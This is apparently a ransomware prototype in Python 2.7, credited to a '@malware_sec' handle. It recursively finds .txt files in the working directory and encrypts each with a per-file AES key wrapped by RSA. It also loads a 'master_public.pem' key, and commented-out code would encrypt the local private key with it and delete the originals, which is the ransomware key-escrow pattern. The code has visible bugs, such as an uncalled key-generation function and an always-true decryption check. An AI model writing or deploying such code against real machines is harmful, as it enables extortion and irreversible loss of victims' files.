#Python 2.7
#Command line AES Encryption Program
#Twitter: @malware_sec
#Python 2.7
import os
import base64
import ast
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from make_keys import *
from decrypt_key import decrypt_key

#if os.path.exists("private_key.pem") or os.path.getsize("private_key.pem") > 0:
	#os.remove("private_key.pem")

if os.path.exists("private_key.pem") and os.path.exists("public_key.pem") and os.path.getsize("public_key.pem") > 0 and os.path.getsize("private_key.pem") > 0:
	pass
else:
	print "[*] No key files detected"
	print "[*] Making key files now..."
	make_keys

#Uncomment this if you don't want to hardcode your RSA public key
with open("master_public.pem", "r") as keyfile:
	master_public = keyfile.read()
	keyfile.close()

pub_key = RSA.importKey(master_public)

with open("private_key.pem", "r") as keyfile:
	local_private = keyfile.read()
	local_private_key = RSA.importKey(local_private)
	keyfile.close()

'''
encrypted_local_private = pub_key.encrypt(local_private, 32)
str_encrypted_local_private = str(encrypted_local_private)

with open("private_key.pem", "w") as keyfile:
	keyfile.write(str(encrypted_local_private))
	keyfile.close()
'''
with open("public_key.pem", "r") as keyfile:
	local_public = keyfile.read()
	keyfile.close()

local_pub_key = RSA.importKey(local_public)
def pad(data):
	return data + b"\0" * (AES.block_size - len(data) % AES.block_size)

def encrypt_b64(message, key):
	message = pad(message)
	iv = Random.new().read(AES.block_size)
	cipher = AES.new(key, AES.MODE_CBC, iv)
	b64_cipher = base64.b64encode(iv + cipher.encrypt(message))
	return b64_cipher

def decrypt_b64(ciphertext, key):
	message = base64.b64decode(ciphertext)
	iv = message[:AES.block_size]
	cipher = AES.new(key, AES.MODE_CBC, iv)
	plaintext = cipher.decrypt(message[AES.block_size:])
	return plaintext.rstrip(b"\0")

def encrypt(message, key, key_size=356):
	message = pad(message)
	iv = Random.new().read(AES.block_size)
	cipher = AES.new(key, AES.MODE_CBC, iv)
	cipher_text = (iv + cipher.encrypt(message))
	return cipher_text

def decrypt(message, key):
	iv = message[:AES.block_size]
	cipher = AES.new(key, AES.MODE_CBC, iv)
	plaintext = cipher.decrypt(message[AES.block_size:])
	return plaintext.rstrip(b"\0")

def encrypt_file(file_name, key, enc_key):
	with open(file_name, 'r') as unencypted_file:
		plaintext = unencypted_file.read()
	crypt = encrypt(plaintext, key)
	with open(file_name + ".enc", 'w') as encrypted_file:
		#encrypted_file.write(crypt)
		encrypted_file.write(str(enc_key) + "\n")
		encrypted_file.write(crypt)
		encrypted_file.close()
	#Option to delete the original file
	#option = raw_input("Do you want to delete the original file?[Y/N]: ")
	#if option == "Y" or option == "y":
	#os.remove(file_name)

def decrypt_file(file_name, key):
	with open(file_name, 'r') as encrypted_file:
		ciphertext = encrypted_file.read().split("\n")
		message = ciphertext[1]
		cipher = pad(message)
		encrypted_file.close()
	crypt = decrypt(cipher, key)
	split = crypt.split("\n")
	text = split[0]
	with open(file_name[:-4] + ".dec", 'w') as encrypted_file:
		encrypted_file.write(text + "\n")

def main():
	ext = [".txt"]
	files_to_enc = []
	#dir_path = os.path.dirname(os.path.realpath(__file__))
	dir_path = os.getcwd()
	for root, dirs, files in os.walk(dir_path):
		for file in files:
			if file.endswith(tuple(ext)):
				files_to_enc.append(os.path.join(root, file))
	print "Encrypting all files in directory " + str(dir_path)
	print "Encrypting files: " + str(files_to_enc)
	for files in files_to_enc:
		raw_key = os.urandom(32)
		enc_key = local_pub_key.encrypt(raw_key, 32)
		encrypt_file(files, raw_key, enc_key)
	print "[*] Encryption Complete!\n"

	option = raw_input("Do you want to decrypt your file? [Y/N]: ")
	if option == "Y" or "y":
		#decrypt_key("private_key.pem")
		#file_name = raw_input("Enter the file name of the encrypted private key (private_key.pem by default): ")
		#local_key = decrypt_key(file_name)
		#with open(file_name, "r") as keyfile:
			#dec_key = keyfile.read()
			#keyfile.close()
		#dec_local_key = RSA.importKey(dec_key)
		print "[*] Decrypting the files"
		ext = [".enc"]
		files_to_dec = []
		#dir_path = os.path.dirname(os.path.realpath(__file__))
		dir_path = os.getcwd()
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				if file.endswith(tuple(ext)):
					files_to_dec.append(os.path.join(root, file))
		print "Decrypting all files in directory " + str(dir_path)
		print "Decrypting files: " + str(files_to_dec)
		for files in files_to_dec:
			with open(files, "r") as foo:
				file_contents = foo.readlines()
				foo.close()
			dec_num = local_private_key.decrypt(ast.literal_eval(file_contents[0])).rstrip(b"\0")
			decrypt_file(files, dec_num)
		print "[!] Decryption complete"

if __name__ == "__main__":
	main()
